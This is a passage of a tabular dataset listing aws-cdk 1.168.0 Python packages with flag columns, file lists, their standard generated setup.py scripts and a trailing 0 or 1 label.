        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 7 - Inactive"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-acmpca-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-acmpca@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-acmpca"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ACMPCA"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_acmpca"",
        ""aws_cdk.aws_acmpca._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_acmpca._jsii"": [
            ""aws-acmpca@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_acmpca"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-apigateway-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-apigateway@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-apigateway"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ApiGateway"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_apigateway"",
        ""aws_cdk.aws_apigateway._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_apigateway._jsii"": [
            ""aws-apigateway@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_apigateway"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-cognito==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-stepfunctions==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-apigatewayv2-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-apigatewayv2@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-apigatewayv2"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::APIGatewayv2"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_apigatewayv2"",
        ""aws_cdk.aws_apigatewayv2._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_apigatewayv2._jsii"": [
            ""aws-apigatewayv2@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_apigatewayv2"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-applicationautoscaling-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-applicationautoscaling@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-applicationautoscaling"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ApplicationAutoScaling"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_applicationautoscaling"",
        ""aws_cdk.aws_applicationautoscaling._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_applicationautoscaling._jsii"": [
            ""aws-applicationautoscaling@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_applicationautoscaling"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-autoscaling-common==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-autoscaling-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-autoscaling@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-autoscaling"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::AutoScaling"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_autoscaling"",
        ""aws_cdk.aws_autoscaling._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_autoscaling._jsii"": [
            ""aws-autoscaling@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_autoscaling"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-autoscaling-common==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancing==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-autoscaling-common-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-autoscaling-common@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-autoscaling-common"",
    ""version"": ""1.168.0"",
    ""description"": ""Common implementation package for @aws-cdk/aws-autoscaling and @aws-cdk/aws-applicationautoscaling"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_autoscaling_common"",
        ""aws_cdk.aws_autoscaling_common._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_autoscaling_common._jsii"": [
            ""aws-autoscaling-common@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_autoscaling_common"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-autoscaling-hooktargets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-autoscaling-hooktargets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-autoscaling-hooktargets"",
    ""version"": ""1.168.0"",
    ""description"": ""Lifecycle hook for AWS AutoScaling"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_autoscaling_hooktargets"",
        ""aws_cdk.aws_autoscaling_hooktargets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_autoscaling_hooktargets._jsii"": [
            ""aws-autoscaling-hooktargets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_autoscaling_hooktargets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-sns-subscriptions==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.aws-sqs==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-batch-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-batch@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-batch"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Batch"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_batch"",
        ""aws_cdk.aws_batch._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_batch._jsii"": [
            ""aws-batch@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_batch"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecr==1.168.0"",
        ""aws-cdk.aws-ecs==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-secretsmanager==1.168.0"",
        ""aws-cdk.aws-ssm==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 4 - Beta"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-certificatemanager-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-certificatemanager@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-certificatemanager"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CertificateManager"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_certificatemanager"",
        ""aws_cdk.aws_certificatemanager._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_certificatemanager._jsii"": [
            ""aws-certificatemanager@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_certificatemanager"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-acmpca==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-route53==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-cloudformation-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-cloudformation@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-cloudformation"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CloudFormation"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_cloudformation"",
        ""aws_cdk.aws_cloudformation._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_cloudformation._jsii"": [
            ""aws-cloudformation@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_cloudformation"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 7 - Inactive"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-cloudfront-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py __init__.py py.typed aws-cloudfront@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-cloudfront"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CloudFront"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_cloudfront"",
        ""aws_cdk.aws_cloudfront._jsii"",
        ""aws_cdk.aws_cloudfront.experimental""
    ],
    ""package_data"": {
        ""aws_cdk.aws_cloudfront._jsii"": [
            ""aws-cloudfront@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_cloudfront"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-ssm==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-cloudwatch-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-cloudwatch@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-cloudwatch"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CloudWatch"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_cloudwatch"",
        ""aws_cdk.aws_cloudwatch._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_cloudwatch._jsii"": [
            ""aws-cloudwatch@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_cloudwatch"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
